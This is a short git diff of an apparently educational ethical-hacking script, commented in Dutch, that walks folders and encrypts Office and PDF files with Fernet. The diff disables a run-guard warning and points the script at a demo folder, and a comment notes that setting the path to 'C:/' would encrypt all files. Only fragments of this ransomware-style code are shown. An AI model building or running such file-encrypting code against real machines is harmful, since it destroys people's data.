@@ -3,8 +3,8 @@ from cryptography.fernet import Fernet
 from dotenv import load_dotenv, set_key
 
 
-print("Dit is iets te gevaarlijk zo maar te runnen. pls lees lines 6-11 van dit script")
-exit()
+# print("Dit is iets te gevaarlijk zo maar te runnen. pls lees lines 6-11 van dit script")
+# exit()
 # omdat dit script alle files op je pc zal proberen encrypteren is het best om zelf een folder te selecteren die geencrypeert mag worden
 # haal line 36 uit comment als je echt wilt riskeren al je files kwijt te zijn.
 # anders kan je line 37 aan passen om een veilige map aan te duiden.
@@ -34,7 +34,7 @@ if ENCRYPTION_KEY == None:
     file_types = ["docx", "pdf", "csv", "xlsx"]   # , "md", "txt"
 
     # path = "C:/"                     # voor alle files af te runnen ipv 1 file
-    path = "C:/DitISGEENPAth"
+    path = "/C:/Users/michi/School/AP/jaar4/ethicalHacking/Deel2/demofolder"
     for root, dirs, files in os.walk(path):
         for file in files:
             file_path = os.path.join(root, file)
